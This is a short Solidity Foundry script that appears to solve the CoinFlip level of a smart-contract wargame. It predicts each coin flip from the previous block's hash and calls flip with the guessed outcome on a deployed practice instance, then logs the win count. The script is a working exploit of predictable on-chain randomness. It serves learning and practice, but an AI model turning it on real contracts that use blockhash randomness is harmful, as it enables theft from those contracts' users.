// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/03_coinflip.sol";

contract AttackerCoinFlipScript is Script {
    CoinFlip coinflip = CoinFlip(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        uint256 blockNum = block.number;
        uint256 blockValue = uint256(blockhash(blockNum - 1));

        coinflip.flip(blockValue >> 255 == 1);

        console.log("Consecutive Wins: ", coinflip.consecutiveWins());

        vm.stopBroadcast();
    }
}
